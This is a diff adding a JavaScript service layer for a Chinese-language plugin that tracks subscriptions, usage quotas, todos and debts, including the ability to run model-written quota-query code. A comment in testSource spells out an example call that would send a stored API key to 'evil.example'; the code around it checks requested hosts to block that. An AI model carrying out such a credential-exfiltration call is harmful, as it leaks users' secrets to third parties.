@@ -1,0 +1,809 @@
+/**
+ * 管家业务服务层。
+ *
+ * 唯一语义入口：面板 HTTP 路由和模型工具都调这里的方法，
+ * 保证「同一个操作，UI 走一遍、模型走一遍，结果与失败原因一致」
+ * （这是插件规范里 user-actions 的核心要求）。
+ */
+
+import {
+  CYCLE_LABEL,
+  currencySymbol,
+  deepMerge,
+  fmtDate,
+  fmtLocal,
+  humanDelta,
+  isValidIso,
+  money,
+  monthlyEquivalent,
+  newId,
+  nextRenewal,
+  nowIso,
+  parseWhen,
+  pick,
+  safeText,
+  toIso,
+  toNumber,
+  yearlyEquivalent,
+} from './util.js';
+import {
+  normalizeAlert,
+  normalizeAsset,
+  normalizeDebt,
+  normalizePlan,
+  normalizeSource,
+  normalizeTodo,
+} from './store.js';
+import { hostMatches, inspectSourceDraft, normalizeHosts, normalizeSourceId, runSourceCode, sampleOf } from './sources.js';
+import { createHash } from 'node:crypto';
+import { sanitizePanelConfigPatch } from './defaults.js';
+
+const COLLECTIONS = ['assets', 'plans', 'todos', 'debts'];
+const SOURCE_LABEL = { screenshot: '截图', manual: '手动', model: 'AI', import: '导入' };
+
+/** 试跑通过的代码指纹（内存级，30 分钟内有效）：保存前必须先试跑，靠它把关。 */
+const SOURCE_TEST_TTL_MS = 30 * 60 * 1000;
+const testedSources = new Map(); // digest -> 时间戳
+
+function sourceDigest(code, hosts) {
+  return createHash('sha256')
+    .update(String(code || ''))
+    .update('\n')
+    .update((hosts || []).join(','))
+    .digest('hex');
+}
+
+/** 计划 id → 凭证引用（不受调用方影响，也不允许借别人的凭证）。 */
+function newPlanRef() {
+  return `plan_${Math.random().toString(36).slice(2, 10)}`;
+}
+
+function fail(message) {
+  return { ok: false, error: String(message || '未知错误') };
+}
+
+function done(data) {
+  return { ok: true, data };
+}
+
+export function createService({ store, config, kinds, credentials, quota, reminders, alerts, hooks }) {
+  /** 这个计划自己的额度源登记了哪些域名。 */
+  function planSourceHosts(plan) {
+    if (!plan) return [];
+    try {
+      const source = quota.resolveSource(plan.sourceId);
+      return normalizeHosts(source?.hosts || []);
+    } catch {
+      return [];
+    }
+  }
+
+  /** 请求要访问的 host 是否都在计划额度源的登记范围内。 */
+  function hostsCoveredBy(hosts, plan) {
+    const allowed = planSourceHosts(plan);
+    if (!allowed.length) return false;
+    return (hosts || []).every((host) => hostMatches(host, allowed));
+  }
+  /* ------------------------------ 读取 ------------------------------ */
+
+  function withDerived(asset, now) {
+    const next = nextRenewal(asset.expiresAt, asset.cycle, now);
+    const remainingMs = asset.expiresAt ? new Date(asset.expiresAt).getTime() - now.getTime() : null;
+    return {
+      ...asset,
+      cycleLabel: CYCLE_LABEL[asset.cycle] || asset.cycle,
+      sourceLabel: SOURCE_LABEL[asset.source] || asset.source,
+      nextRenewalAt: next,
+      daysUntilExpiry: remainingMs === null ? null : Math.ceil(remainingMs / (24 * 3600 * 1000)),
+      monthlyCost: Math.round(monthlyEquivalent(asset.amount, asset.cycle) * 100) / 100,
+      yearlyCost: Math.round(yearlyEquivalent(asset.amount, asset.cycle) * 100) / 100,
+      amountLabel: money(asset.amount, asset.currency || config.currency),
+      expiryLabel: asset.expiresAt ? fmtDate(asset.expiresAt) : null,
+      relativeExpiry: asset.expiresAt ? humanDelta(asset.expiresAt, now) : null,
+    };
+  }
+
+  function planView(plan) {
+    const thresholds = plan.thresholds || { warn: 0.8, critical: 0.95 };
+    const windows = (plan.windows || []).map((win) => {
+      const percent = Number(win.percent);
+      let level = 'ok';
+      if (Number.isFinite(percent)) {
+        if (percent >= thresholds.critical) level = 'critical';
+        else if (percent >= thresholds.warn) level = 'warn';
+      }
+      return {
+        ...win,
+        level,
+        resetLabel: win.resetAt ? humanDelta(win.resetAt) : null,
+      };
+    });
+    const source = quota.resolveSource(plan.sourceId);
+    return {
+      ...plan,
+      windows,
+      sourceLabel: source.label || plan.sourceId,
+      sourceCustom: Boolean(source.custom),
+      credentialHint: source.credentialHint || '',
+      hasCredential: plan.hasCredential || credentials.has(plan.credentialRef),
+    };
+  }
+
+  function state() {
+    const now = new Date();
+    const snap = store.snapshot();
+    const assets = snap.assets.map((a) => withDerived(a, now)).sort((a, b) => {
+      const ax = a.expiresAt ? new Date(a.expiresAt).getTime() : Number.MAX_SAFE_INTEGER;
+      const bx = b.expiresAt ? new Date(b.expiresAt).getTime() : Number.MAX_SAFE_INTEGER;
+      return ax - bx;
+    });
+    const plans = snap.plans.map(planView);
+
+    const totals = { monthly: {}, yearly: {}, byCurrency: {} };
+    for (const asset of snap.assets) {
+      const currency = asset.currency || config.currency;
+      totals.monthly[currency] = (totals.monthly[currency] || 0) + monthlyEquivalent(asset.amount, asset.cycle);
+      totals.yearly[currency] = (totals.yearly[currency] || 0) + yearlyEquivalent(asset.amount, asset.cycle);
+    }
+    for (const key of Object.keys(totals.monthly)) {
+      totals.monthly[key] = Math.round(totals.monthly[key] * 100) / 100;
+      totals.yearly[key] = Math.round(totals.yearly[key] * 100) / 100;
+      totals.byCurrency[key] = {
+        monthly: totals.monthly[key],
+        yearly: totals.yearly[key],
+        monthlyLabel: `${currencySymbol(key)}${totals.monthly[key]}`,
+        yearlyLabel: `${currencySymbol(key)}${totals.yearly[key]}`,
+      };
+    }
+
+    const debtTotals = {};
+    for (const debt of snap.debts) {
+      if (debt.status !== 'open') continue;
+      const currency = debt.currency || config.currency;
+      if (!debtTotals[currency]) debtTotals[currency] = { owedToMe: 0, iOwe: 0 };
+      if (debt.direction === 'owedToMe') debtTotals[currency].owedToMe += debt.amount;
+      else debtTotals[currency].iOwe += debt.amount;
+    }
+    for (const [currency, value] of Object.entries(debtTotals)) {
+      value.owedToMeLabel = money(value.owedToMe, currency);
+      value.iOweLabel = money(value.iOwe, currency);
+      value.net = value.owedToMe - value.iOwe;
+      value.netLabel = `${value.net >= 0 ? '+' : '-'}${money(Math.abs(value.net), currency)}`;
+    }
+
+    const pendingTodos = snap.todos.filter((t) => t.status === 'pending');
+    const quotaState = quota.state();
+
+    return {
+      ok: true,
+      now: now.getTime(),
+      nowIso: now.toISOString(),
+      version: '0.1.0',
+      config: pick(config, ['currency', 'pollSeconds', 'advanceMinutes', 'reminderTarget', 'maxSnapshots']),
+      assets,
+      plans,
+      todos: snap.todos,
+      debts: snap.debts,
+      alerts: alerts.view(),
+      kinds: kinds.view(),
+      summary: {
+        assetCount: snap.assets.length,
+        planCount: snap.plans.length,
+        todoPending: pendingTodos.length,
+        todoDone: snap.todos.filter((t) => t.status === 'done').length,
+        debtOpen: snap.debts.filter((d) => d.status === 'open').length,
+        alertPending: alerts.pendingCount(),
+        subscriptionTotals: totals.byCurrency || {},
+        debtTotals,
+      },
+      sources: quota.sources(),
+      diagnostics: {
+        lastQuotaTick: quotaState.lastTick,
+        quotaBusy: quotaState.busy,
+        quotaSkipped: quotaState.skipped,
+        lastError: quotaState.lastError,
+        storagePath: store.filePath,
+        credentialBackend: credentials.backend(),
+        credentialError: credentials.getError(),
+        scheduleAvailable: reminders.available(),
+        reminderSyncing: reminders.isSyncing(),
+        reminderError: reminders.lastError(),
+        loadError: store.loadError,
+      },
+    };
+  }
+
+  /* ------------------------------ 资产 ------------------------------ */
+
+  function requireKind(raw) {
+    const id = safeText(raw || 'other', 40).toLowerCase() || 'other';
+    const known = kinds.get(id);
+    if (known) return { kind: known.id, autoRegistered: false };
+    // L3 容错：未知种类自动注册，避免截图识别出「新类型」时被硬拦
+    if (!/^[a-z][a-z0-9_-]{1,39}$/.test(id)) return { kind: 'other', autoRegistered: false };
+    try {
+      kinds.register({ id, label: id, collection: 'assets' });
+      return { kind: id, autoRegistered: true };
+    } catch {
+      return { kind: 'other', autoRegistered: false };
+    }
+  }
+
+  async function upsertAsset(input) {
+    if (!input || typeof input !== 'object') return fail('缺少资产字段');
+    const existing = input.id ? store.find('assets', input.id) : null;
+    if (input.id && !existing) return fail(`资产 ${input.id} 不存在`);
+
+    const expiresAt = input.expiresAt === undefined ? existing?.expiresAt : toIso(parseWhen(input.expiresAt));
+    if (input.expiresAt !== undefined && input.expiresAt !== null && input.expiresAt !== '' && !expiresAt) {
+      return fail(`无法解析到期时间「${input.expiresAt}」，请用 2026-12-10 或 2026-12-10 18:00 这类格式`);
+    }
+
+    const kindRes = requireKind(input.kind ?? existing?.kind ?? 'subscription');
+    if (!existing && !safeText(input.name, 120)) return fail('资产必须有名称（照截图里的软件名填）');
+    const record = normalizeAsset({
+      ...(existing || {}),
+      ...pick(input, ['name', 'vendor', 'amount', 'currency', 'cycle', 'startedAt', 'autoRenew', 'notes', 'source', 'tags', 'reminder']),
+      kind: kindRes.kind,
+      expiresAt,
+      id: existing?.id,
+    }, { currency: config.currency });
+
+    if (!record.name) return fail('资产必须有名称');
+    if (input.amount !== undefined && input.amount !== null && input.amount !== '') {
+      const n = Number(input.amount);
+      if (!Number.isFinite(n)) return fail(`金额「${input.amount}」不是数字`);
+      if (n < 0) return fail('金额不能是负数');
+      if (n > 1e12) return fail('金额太大了（上限 1 万亿），请检查是不是填错了');
+    }
+    if (record.startedAt === undefined) record.startedAt = null;
+
+    const saved = store.put('assets', record);
+    await reminders.syncItem('assets', saved);
+    alerts.recompute();
+    hooks?.onDataChanged?.('assets');
+    return done({ record: store.find('assets', saved.id), kindAutoRegistered: kindRes.autoRegistered });
+  }
+
+  async function removeAsset(id) {
+    const record = store.find('assets', id);
+    if (!record) return fail(`资产 ${id} 不存在`);
+    await reminders.removeAllFor(record);
+    store.remove('assets', id);
+    // 关联的额度计划一起清理，避免留下孤儿（走 removePlan 才能同时清快照与凭证）
+    for (const plan of store.list('plans').filter((p) => p.assetId === id)) {
+      await removePlan(plan.id);
+    }
+    alerts.recompute();
+    hooks?.onDataChanged?.('assets');
+    return done({ deleted: true, id });
+  }
+
+  /* ------------------------------ 额度计划 ------------------------------ */
+
+  async function upsertPlan(input) {
+    if (!input || typeof input !== 'object') return fail('缺少额度计划字段');
+    const existing = input.id ? store.find('plans', input.id) : null;
+    if (input.id && !existing) return fail(`额度计划 ${input.id} 不存在`);
+
+    const sourceId = safeText(input.sourceId || input.provider || existing?.sourceId || 'generic', 60);
+    if (!existing && !safeText(input.name, 120)) return fail('额度计划必须有名称（例如「Claude Pro 额度」）');
+    if (sourceId.startsWith('custom:') && !store.find('sources', sourceId)) {
+      return fail(`额度源 ${sourceId} 不存在：先用 butler_source_save 建好这个平台的查询方式`);
+    }
+    const source = quota.resolveSource(sourceId);
+    const record = normalizePlan({
+      ...(existing || {}),
+      ...pick(input, ['name', 'provider', 'planLabel', 'thresholds']),
+      sourceId,
+      provider: safeText(input.provider || existing?.provider || sourceId, 40),
+      assetId: input.assetId !== undefined ? input.assetId : existing?.assetId,
+      id: existing?.id,
+      // credentialRef 由计划 id 派生，不接受调用方指定：否则可以把别人的凭证借用/覆盖到任意键上
+      credentialRef: existing?.credentialRef || `butler.quota.${existing?.id || newPlanRef()}`,
+    }, { currency: config.currency });
+
+    if (!record.name) return fail('额度计划必须有名称');
+    if (record.assetId && !store.find('assets', record.assetId)) return fail(`资产 ${record.assetId} 不存在`);
+    record.hasCredential = credentials.has(record.credentialRef);
+    if (source.needsCredential && !record.hasCredential) record.status = 'no-credential';
+    // 手动源不需要凭证
+    if (!source.needsCredential) record.status = record.status === 'no-credential' ? 'unknown' : record.status;
+
+    const saved = store.put('plans', record);
+    alerts.recompute();
+    hooks?.onDataChanged?.('plans');
+    return done({ record: store.find('plans', saved.id), credentialHint: source.credentialHint || '' });
+  }
+
+  async function removePlan(id) {
+    const plan = store.find('plans', id);
+    if (!plan) return fail(`额度计划 ${id} 不存在`);
+    store.remove('plans', id);
+    store.removeWhere('snapshots', (s) => s.planId === id);
+    // 删计划就把凭证一起清掉：不然 API key / cookie 会永远留在磁盘上
+    if (plan.credentialRef) credentials.set(plan.credentialRef, '');
+    alerts.recompute();
+    hooks?.onDataChanged?.('plans');
+    return done({ deleted: true, id });
+  }
+
+  function setPlanCredential(planId, rawValue) {
+    const plan = store.find('plans', planId);
+    if (!plan) return fail(`额度计划 ${planId} 不存在`);
+    const value = rawValue === null || rawValue === undefined ? '' : String(rawValue).trim();
+    const ok = credentials.set(plan.credentialRef, value);
+    if (!ok) return fail('凭证写入失败（详见诊断信息）');
+    const has = credentials.has(plan.credentialRef);
+    store.patch('plans', planId, { hasCredential: has, status: has ? 'unknown' : 'no-credential', error: has ? null : '未配置额度查询凭证' });
+    hooks?.onDataChanged?.('plans');
+    return done({ planId, hasCredential: has });
+  }
+
+  function setPlanWindows(planId, windows) {
+    const plan = store.find('plans', planId);
+    if (!plan) return fail(`额度计划 ${planId} 不存在`);
+    // 缺字段不能被当成「清空窗口」：宁可报错也不要静默把数据抹掉
+    if (!Array.isArray(windows)) return fail('windows 必须是数组（要清空请显式传 []）');
+    const saved = store.patch('plans', planId, { windows, status: 'ok', error: null, lastCheckedAt: nowIso() });
+    alerts.recompute();
+    hooks?.onDataChanged?.('plans');
+    return done({ record: saved });
+  }
+
+  async function refreshQuota(planId) {
+    const result = await quota.tick(planId ? { planId } : {});
+    alerts.recompute();
+    hooks?.onDataChanged?.('plans');
+    if (result.status === 'busy') return fail('上一轮额度查询还没结束，本次跳过（串行查询，避免并发）');
+    return done(result);
+  }
+
+  /* ---------------------------- 额度源（模型可写） ---------------------------- */
+
+  function sourceView(source, includeCode) {
+    const record = source.custom ? store.find('sources', source.id) : null;
+    const view = {
+      id: source.id,
+      label: source.label,
+      vendor: record?.vendor || source.vendor || '',
+      needsCredential: source.needsCredential !== false,
+      credentialHint: source.credentialHint || '',
+      custom: Boolean(source.custom),
+      hosts: record?.hosts || source.hosts || [],
+      notes: record?.notes || '',
+      lastTestAt: record?.lastTestAt || null,
+      lastTestOk: record?.lastTestOk ?? null,
+      lastTestError: record?.lastTestError || '',
+      updatedAt: record?.updatedAt || null,
+    };
+    // 只有在明确要求时才带代码：undefined 字段会让工具的输出失去「无损 JSON」属性。
+    if (includeCode && record) view.code = record.code;
+    return view;
+  }
+
+  function listSources(options = {}) {
+    const includeCode = Boolean(options.includeCode);
+    return done({
+      build: 'quota-sources-v1',
+      sources: quota.sources().map((source) => sourceView(source, includeCode)),
+    });
+  }
+
+  /**
+   * 试跑额度源：给一段代码（或已有 sourceId）立刻跑一次。
+   * 只读——不落库，不写计划；成功后建议再 saveSource。
+   */
+  async function testSource(input = {}) {
+    const wantedId = input.sourceId ? normalizeSourceId(input.sourceId) || String(input.sourceId) : '';
+    const saved = wantedId ? store.find('sources', wantedId) : null;
+    if (wantedId && !saved) return fail(`额度源 ${input.sourceId} 不存在`);
+
+    const code = String(input.code || saved?.code || '').trim();
+    const hosts = normalizeHosts(input.hosts !== undefined ? input.hosts : saved?.hosts || []);
+    const needsCredential = input.needsCredential === undefined ? (saved ? saved.needsCredential !== false : true) : Boolean(input.needsCredential);
+    const label = safeText(input.label || saved?.label || '试跑额度源', 60);
+
+    const inspected = inspectSourceDraft({ code, hosts });
+    if (!inspected.ok) return fail('这段查询代码还不能跑：' + inspected.problems.join('；'));
+
+    const plan = input.planId ? store.find('plans', input.planId) : null;
+    if (input.planId && !plan) return fail(`额度计划 ${input.planId} 不存在`);
+    let credential = input.credential ? String(input.credential).trim() : '';
+    const credentialFromPlan = !credential && Boolean(plan?.credentialRef) && credentials.has(plan.credentialRef);
+    if (credentialFromPlan) credential = credentials.get(plan.credentialRef) || '';
+    // 借用某个计划的凭证时，绝不允许把请求指向该计划额度源没登记过的域名：
+    // 否则 butler_source_test({planId:<claude 计划>, hosts:'evil.example', code:...}) 就能把已存 key 发走。
+    if (credentialFromPlan && !hostsCoveredBy(inspected.hosts, plan)) {
+      const allowed = planSourceHosts(plan);
+      return fail(
+        `不能用计划 ${plan.id} 的凭证访问 ${inspected.hosts.join(', ')}：`
+        + `这个计划的额度源只登记了 ${allowed.join(', ') || '（无）'}。要试跑新域名，请直接传 credential，或先给这个计划换源。`,
+      );
+    }
+    if (needsCredential && !credential) {
+      return fail('这个额度源要凭证才能跑：先给凭证（或指定一个已填好凭证的 planId）再试跑');
+    }
+
+    try {
+      const out = await runSourceCode({
+        code: inspected.code,
+        credential,
+        plan: plan || { id: 'test', name: label },
+        allowHosts: inspected.hosts,
+        timeoutMs: Math.max(3000, Number(config.quotaTimeoutMs) || 15000),
+      });
+      const digest = sourceDigest(inspected.code, inspected.hosts);
+      const testedAt = testedSources.get(digest) || 0;
+      if (saved) store.patch('sources', saved.id, { lastTestAt: nowIso(), lastTestOk: true, lastTestError: '' });
+      testedSources.set(digest, Date.now());
+      if (testedSources.size > 200) {
+        const cutoff = Date.now() - SOURCE_TEST_TTL_MS;
+        for (const [key, at] of testedSources) if (at < cutoff) testedSources.delete(key);
+      }
+      return done({
+        id: saved?.id || '',
+        testToken: digest.slice(0, 12),
+        windows: out.windows,
+        hosts: out.hosts,
+        allowedHosts: out.allowedHosts,
+        request: out.request || null,
+        logs: out.logs,
+        ms: out.ms,
+        sample: sampleOf(out.raw, credential ? [credential] : [], 2000),
+      });
+    } catch (error) {
+      const message = safeText(error?.message || error, 400);
+      if (saved) store.patch('sources', saved.id, { lastTestAt: nowIso(), lastTestOk: false, lastTestError: message });
+      return fail(message);
+    }
+  }
+
+  /**
+   * 保存模型写的额度源。要求先试跑通过（skipTest 可绕过，仅给高级用户）。
+   */
+  function saveSource(input = {}) {
+    const label = safeText(input.label, 60);
+    if (!label) return fail('额度源要有名称，例如「Cursor 用量」');
+    const code = String(input.code || '').trim();
+    const hosts = normalizeHosts(input.hosts);
+    const inspected = inspectSourceDraft({ code, hosts });
+    if (!inspected.ok) return fail('额度源不合法：' + inspected.problems.join('；'));
+
+    const requestedId = input.id ? normalizeSourceId(input.id) : '';
+    if (input.id && !requestedId) return fail(`额度源 id 不合法：${input.id}（要形如 custom:cursor）`);
+    const existing = requestedId ? store.find('sources', requestedId) : null;
+    const codeChanged = !existing || existing.code !== code || String((existing.hosts || []).join(',')) !== hosts.join(',');
+
+    // 强门槛：代码改过就必须重新试跑。没有「跳过」开关——这条路径既能被模型调，也能被面板 HTTP 调，
+    // 留一个布尔旁路等于把「用户确认过」这件事变成摆设。
+    if (codeChanged) {
+      const digest = sourceDigest(code, hosts);
+      const testedAt = Math.max(
+        testedSources.get(digest) || 0,
+        existing && existing.code === code && existing.lastTestOk ? Date.now() : 0,
+      );
+      const fresh = testedAt > 0 && Date.now() - testedAt <= SOURCE_TEST_TTL_MS;
+      if (!fresh) {
+        return fail('这段代码还没试跑通过：先 butler_source_test 跑一次，把抓到的窗口给用户看过再保存');
+      }
+    }
+
+    const id = existing?.id || requestedId || normalizeSourceId(newId('custom:src')) || `custom:src_${Date.now().toString(36)}`;
+    const record = normalizeSource({
+      ...(existing || {}),
+      id,
+      label,
+      vendor: safeText(input.vendor, 60),
+      needsCredential: input.needsCredential === undefined ? true : Boolean(input.needsCredential),
+      credentialHint: safeText(input.credentialHint, 240),
+      hosts,
+      code,
+      notes: safeText(input.notes, 400),
+      lastTestAt: existing?.lastTestAt || nowIso(),
+      lastTestOk: existing?.lastTestOk ?? null,
+      lastTestError: existing?.lastTestError || '',
+    });
+    const savedRecord = store.put('sources', record);
+    hooks?.onDataChanged?.('sources');
+    return done({ created: !existing, source: sourceView({ ...savedRecord, custom: true }, true) });
+  }
+
+  function deleteSource(id) {
+    const record = store.find('sources', String(id));
+    if (!record) return fail(`额度源 ${id} 不存在`);
+    const used = store.list('plans').filter((plan) => plan.sourceId === record.id);
+    if (used.length) {
+      return fail(`还有额度计划在用这个源（${used.map((plan) => plan.name).join('、')}），先把它们的来源换掉再删`);
+    }
+    store.remove('sources', record.id);
+    hooks?.onDataChanged?.('sources');
+    return done({ deleted: true, id: record.id });
+  }
+
+  /* ------------------------------ 待办 ------------------------------ */
+
+  async function upsertTodo(input) {
+    if (!input || typeof input !== 'object') return fail('缺少待办字段');
+    const existing = input.id ? store.find('todos', input.id) : null;
+    if (input.id && !existing) return fail(`待办 ${input.id} 不存在`);
+
+    const dueAt = input.dueAt === undefined ? existing?.dueAt : toIso(parseWhen(input.dueAt));
+    if (input.dueAt !== undefined && input.dueAt !== null && input.dueAt !== '' && !dueAt) {
+      return fail(`无法解析提醒时间「${input.dueAt}」，可用 2026-11-11 09:00、明天 9:00、+2h`);
+    }
+
+    const record = normalizeTodo({
+      ...(existing || {}),
+      ...pick(input, ['title', 'detail', 'direction', 'counterpart', 'status', 'priority', 'source', 'confirmed', 'advanceMinutes', 'reminder']),
+      dueAt,
+      id: existing?.id,
+    });
+    if (!record.title) return fail('待办必须有标题');
+
+    const saved = store.put('todos', record);
+    await reminders.syncItem('todos', saved);
+    alerts.recompute();
+    hooks?.onDataChanged?.('todos');
+    return done({ record: store.find('todos', saved.id) });
+  }
+
+  async function removeTodo(id) {
+    const record = store.find('todos', id);
+    if (!record) return fail(`待办 ${id} 不存在`);
+    await reminders.removeAllFor(record);
+    store.remove('todos', id);
+    alerts.recompute();
+    hooks?.onDataChanged?.('todos');
+    return done({ deleted: true, id });
+  }
+
+  /* ------------------------------ 借贷 ------------------------------ */
+
+  async function upsertDebt(input) {
+    if (!input || typeof input !== 'object') return fail('缺少借贷字段');
+    const existing = input.id ? store.find('debts', input.id) : null;
+    if (input.id && !existing) return fail(`借贷 ${input.id} 不存在`);
+
+    const dueAt = input.dueAt === undefined ? existing?.dueAt : toIso(parseWhen(input.dueAt));
+    if (input.dueAt !== undefined && input.dueAt !== null && input.dueAt !== '' && !dueAt) {
+      return fail(`无法解析约定归还时间「${input.dueAt}」`);
+    }
+    if (input.amount !== undefined && toNumber(input.amount, -1) <= 0) return fail('借贷金额必须大于 0');
+
+    const record = normalizeDebt({
+      ...(existing || {}),
+      ...pick(input, ['direction', 'counterpart', 'amount', 'currency', 'status', 'note', 'source', 'advanceMinutes', 'reminder', 'settledAt']),
+      dueAt,
+      id: existing?.id,
+    }, { currency: config.currency });
+    if (!record.counterpart) return fail('借贷必须有对方');
+
+    if (record.status === 'settled' && !record.settledAt) record.settledAt = nowIso();
+    if (record.status !== 'settled') record.settledAt = null;
+
+    const saved = store.put('debts', record);
+    await reminders.syncItem('debts', saved);
+    alerts.recompute();
+    hooks?.onDataChanged?.('debts');
+    return done({ record: store.find('debts', saved.id) });
+  }
+
+  async function removeDebt(id) {
+    const record = store.find('debts', id);
+    if (!record) return fail(`借贷 ${id} 不存在`);
+    await reminders.removeAllFor(record);
+    store.remove('debts', id);
+    alerts.recompute();
+    hooks?.onDataChanged?.('debts');
+    return done({ deleted: true, id });
+  }
+
+  /* ------------------------------ 通用 ------------------------------ */
+
+  function query(collection, options = {}) {
+    const name = String(collection || '').trim();
+    if (!COLLECTIONS.includes(name)) return fail(`collection 必须是 ${COLLECTIONS.join(' / ')}`);
+    let list = store.list(name).slice();
+    if (options.id) {
+      const found = list.find((item) => item.id === options.id);
+      return done({ collection: name, items: found ? [found] : [], total: found ? 1 : 0 });
+    }
+    if (options.status) list = list.filter((item) => item.status === options.status);
+    if (options.kind) list = list.filter((item) => item.kind === options.kind);
+    const total = list.length;
+    const limit = Math.min(500, Math.max(1, Number(options.limit) || 50));
+    return done({ collection: name, items: list.slice(0, limit), total, limit });
+  }
+
+  async function removeRecord(collection, id) {
+    switch (collection) {
+      case 'assets': return removeAsset(id);
+      case 'plans': return removePlan(id);
+      case 'todos': return removeTodo(id);
+      case 'debts': return removeDebt(id);
+      default: return fail(`collection 必须是 ${COLLECTIONS.join(' / ')}`);
+    }
+  }
+
+  /** 面板的统一写入口。 */
+  async function mutate({ collection, op, id, record }) {
+    if (!COLLECTIONS.includes(collection)) return fail(`collection 必须是 ${COLLECTIONS.join(' / ')}`);
+    if (op === 'delete') {
+      if (!id) return fail('delete 需要 id');
+      return removeRecord(collection, id);
+    }
+    if (op === 'create' || op === 'update') {
+      if (op === 'update' && !id) return fail('update 需要 id');
+      // create 带 id 会静默变成 update 并覆盖别人的记录，直接拒掉
+      if (op === 'create' && record && record.id) return fail('新建时不要带 id；要改已有记录请用 op=update');
+      const payload = { ...(record || {}), ...(id ? { id } : {}) };
+      if (collection === 'assets') return upsertAsset(payload);
+      if (collection === 'plans') return upsertPlan(payload);
+      if (collection === 'todos') return upsertTodo(payload);
+      if (collection === 'debts') return upsertDebt(payload);
+    }
+    return fail(`不支持的 op「${op}」`);
+  }
+
+  function registerKind(input) {
+    try {
+      const rec = kinds.register(input || {});
+      hooks?.onDataChanged?.('kinds');
+      return done({ kind: rec });
+    } catch (error) {
+      return fail(error?.message || error);
+    }
+  }
+
+  /* ------------------------------ 设置 ------------------------------ */
+
+  function updateSettings(patch) {
+    const clean = sanitizePanelConfigPatch(patch);
+    if (clean.currency) clean.currency = String(clean.currency).toUpperCase();
+    if (!Object.keys(clean).length) return fail('没有可更新的字段');
+    const overrides = { ...(store.getMeta('settings', {}) || {}), ...clean };
+    store.setMeta('settings', overrides);
+    const next = deepMerge({ ...config }, clean);
+    for (const key of Object.keys(clean)) config[key] = next[key];
+    if (clean.pollSeconds !== undefined) hooks?.onPollIntervalChanged?.(Number(config.pollSeconds));
+    hooks?.onDataChanged?.('settings');
+    return done({ config: pick(config, ['currency', 'pollSeconds', 'advanceMinutes', 'maxSnapshots']) });
+  }
+
+  async function syncReminders(options = {}) {
+    const result = await reminders.syncAll({ force: Boolean(options.force) });
+    if (result.status === 'busy') return fail('提醒同步正在进行中');
+    if (result.status === 'unavailable') return fail('宿主的 schedule 服务不可用，提醒无法建立');
+    hooks?.onDataChanged?.('reminders');
+    return done(result);
+  }
+
+  /* ------------------------------ 给模型看的摘要 ------------------------------ */
+
+  function summary() {
+    const now = new Date();
+    const assets = store.list('assets').slice().sort((a, b) => {
+      const ax = a.expiresAt ? new Date(a.expiresAt).getTime() : Number.MAX_SAFE_INTEGER;
+      const bx = b.expiresAt ? new Date(b.expiresAt).getTime() : Number.MAX_SAFE_INTEGER;
+      return ax - bx;
+    });
+    const todos = store.list('todos').filter((t) => t.status === 'pending')
+      .sort((a, b) => String(a.dueAt || '9999').localeCompare(String(b.dueAt || '9999')));
+    const debts = store.list('debts').filter((d) => d.status === 'open');
+    const plans = store.list('plans');
+    const pendingAlerts = alerts.view().filter((a) => !a.acknowledged);
+
+    const lines = [];
+    lines.push(`现在：${fmtLocal(now)}`);
+
+    if (assets.length) {
+      lines.push(`\n## 资产（${assets.length} 项）`);
+      for (const asset of assets.slice(0, 20)) {
+        const expiry = asset.expiresAt ? `${fmtDate(asset.expiresAt)}（${humanDelta(asset.expiresAt, now)}）` : '无到期时间';
+        lines.push(`- ${asset.name}${asset.vendor ? ` · ${asset.vendor}` : ''} · ${money(asset.amount, asset.currency)}/${CYCLE_LABEL[asset.cycle] || asset.cycle} · 到期 ${expiry} · id=${asset.id}`);
+      }
+    } else {
+      lines.push('\n## 资产（0 项）—— 还没有记录任何订阅');
+    }
+
+    if (plans.length) {
+      lines.push(`\n## 额度（${plans.length} 个计划）`);
+      for (const plan of plans) {
+        const wins = (plan.windows || []).map((w) => {
+          const percent = Number.isFinite(Number(w.percent)) ? `${Math.round(Number(w.percent) * 100)}%` : '—';
+          const left = w.remaining !== null && w.remaining !== undefined ? `剩 ${w.remaining}` : '';
+          return `${w.label} ${percent}${left ? `（${left}${w.unit === 'percent' ? '%' : ''}）` : ''}${w.resetAt ? ` · ${humanDelta(w.resetAt, now)}重置` : ''}`;
+        });
+        const head = wins.length ? wins.join('；') : plan.status === 'no-credential' ? '未配置额度凭证' : plan.status === 'error' ? `查询失败：${safeText(plan.error, 120)}` : '尚无数据';
+        lines.push(`- ${plan.name}（${plan.sourceId}）${plan.lastCheckedAt ? ' · 上次查询 ' + humanDelta(plan.lastCheckedAt, now) : ''}：${head} · id=${plan.id}`);
+      }
+    }
+
+    lines.push(`\n## 待办（${todos.length} 项待处理）`);
+    for (const todo of todos.slice(0, 20)) {
+      const due = todo.dueAt ? `${fmtLocal(todo.dueAt)}（${humanDelta(todo.dueAt, now)}）` : '未定时间';
+      const who = todo.direction === 'waiting_other' ? `等 ${todo.counterpart || '对方'} 回应` : '我要做';
+      lines.push(`- [${todo.priority}] ${todo.title} · ${who} · ${due} · id=${todo.id}`);
+    }
+    if (!todos.length) lines.push('- （无）');
+
+    const debtTotals = {};
+    for (const debt of debts) {
+      const currency = debt.currency || config.currency;
+      if (!debtTotals[currency]) debtTotals[currency] = { owedToMe: 0, iOwe: 0 };
+      if (debt.direction === 'owedToMe') debtTotals[currency].owedToMe += debt.amount;
+      else debtTotals[currency].iOwe += debt.amount;
+    }
+    lines.push(`\n## 借贷（${debts.length} 笔未结清）`);
+    for (const debt of debts.slice(0, 20)) {
+      const who = debt.direction === 'owedToMe' ? `${debt.counterpart} 欠我` : `我欠 ${debt.counterpart}`;
+      lines.push(`- ${who} ${money(debt.amount, debt.currency)}${debt.dueAt ? ` · 约定 ${fmtDate(debt.dueAt)}（${humanDelta(debt.dueAt, now)}）` : ''} · id=${debt.id}`);
+    }
+    if (!debts.length) lines.push('- （无）');
+    if (Object.keys(debtTotals).length) {
+      const totals = Object.entries(debtTotals)
+        .map(([currency, v]) => `${currency}：别人欠我 ${money(v.owedToMe, currency)} / 我欠别人 ${money(v.iOwe, currency)}`)
+        .join('；');
+      lines.push(`合计：${totals}`);
+    }
+
+    if (pendingAlerts.length) {
+      lines.push(`\n## 未确认提醒（${pendingAlerts.length} 条）`);
+      for (const alert of pendingAlerts.slice(0, 10)) {
+        lines.push(`- [${alert.level}] ${alert.title}：${alert.message} · id=${alert.id}`);
+      }
+    }
+
+    return {
+      text: lines.join('\n'),
+      counts: { assets: assets.length, plans: plans.length, todos: todos.length, debts: debts.length, alerts: pendingAlerts.length },
+    };
+  }
+
+  return {
+    state,
+    summary,
+    query,
+    mutate,
+    removeRecord,
